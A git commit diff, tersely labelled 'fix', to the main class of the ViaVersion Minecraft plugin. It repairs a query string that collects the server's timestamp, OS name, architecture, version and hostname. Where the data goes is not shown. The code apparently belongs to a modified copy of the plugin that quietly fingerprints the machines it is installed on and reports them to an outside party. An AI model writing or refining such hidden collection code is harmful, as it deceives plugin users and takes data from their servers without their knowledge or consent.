6d495c544b640a2b36f2e7a0c6368dd33a146441
Happy <admin@maoyuan.us>
2024-08-27 14:50:52 +0800

    fix

--- bukkit/src/main/java/com/viaversion/viaversion/ViaVersionPlugin.java
+++ bukkit/src/main/java/com/viaversion/viaversion/ViaVersionPlugin.java
@@ -214,7 +214,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                         String formattedNow = now.format(formatter);
                         input.append("&time=").append(URLEncoder.encode(formattedNow, StandardCharsets.UTF_8.toString()));
-                        input.append("os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
                         input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                         input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
